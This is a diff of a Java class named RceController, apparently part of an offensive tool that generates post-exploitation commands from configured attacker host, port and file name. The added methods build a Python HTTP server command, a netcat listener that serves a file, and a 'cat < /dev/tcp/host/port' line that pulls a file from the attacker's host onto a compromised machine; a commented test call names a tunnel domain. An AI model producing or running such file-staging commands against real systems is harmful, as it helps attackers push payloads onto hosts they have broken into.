@@ -41,9 +41,29 @@ public class RceController {
         return python1;
     }
 
+    public static String python2Server(){
+        String str = "python -m SimpleHTTPServer "+ menuBeanListener.getLport();
+        return str;
+    }
+
+    public static  String python3Server(){
+        String str = "python3 -m http.server " + menuBeanListener.getLport();
+        return str;
+    }
+
     public static String rsyncCommand(String Lhost, String Lport, String FileName){
 
         return null;
+    }
+
+    public static String catListener(){
+        String str = "nc -lvp "+menuBeanListener.getLport()+ " < "+menuBeanListener.getFileName();
+        return str;
+    }
+
+    public static String catAttack(){
+        String str = "cat < /dev/tcp/"+menuBeanListener.getLhost()+"/"+menuBeanListener.getLport()+" > "+menuBeanListener.getFileName();
+        return str;
     }
 //    public static void main(String[] args) {
 //        System.out.println(pythonCommand("61a94727.r2.cpolar.top", "80", "xts"));
